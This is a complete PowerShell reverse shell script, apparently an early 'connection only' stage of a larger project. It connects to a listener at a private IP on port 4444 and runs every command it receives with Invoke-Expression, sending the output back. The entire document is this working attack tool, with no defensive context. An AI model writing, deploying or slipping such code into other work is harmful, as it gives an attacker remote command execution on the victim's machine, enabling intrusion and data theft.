# --- PHASE 1: CONNECTION ONLY ---
$ip = '192.168.1.15'
$port = 4444

try {
    # Create the client and connect
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    
    # Setup reader and writer
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    # Send a "Success" message to your listener
    $writer.WriteLine("--- Connection Established ---")
    $writer.Write("PS " + (Get-Location).Path + "> ")

    # The Loop
    while($client.Connected) {
        if ($stream.DataAvailable) {
            $input = $reader.ReadLine()
            if ($input -eq "exit") { break }
            
            # Execute command and capture output
            $out = try { Invoke-Expression $input 2>&1 | Out-String } catch { $_.Exception.Message }
            
            # Send back to listener
            $writer.WriteLine($out)
            $writer.Write("PS " + (Get-Location).Path + "> ")
        }
        Start-Sleep -Milliseconds 100
    }
} catch {
    # If this hits, it means it couldn't even find the IP/Port
    Write-Error "Could not connect to $ip on port $port"
    Pause 
} finally {
    if ($client) { $client.Close() }
}
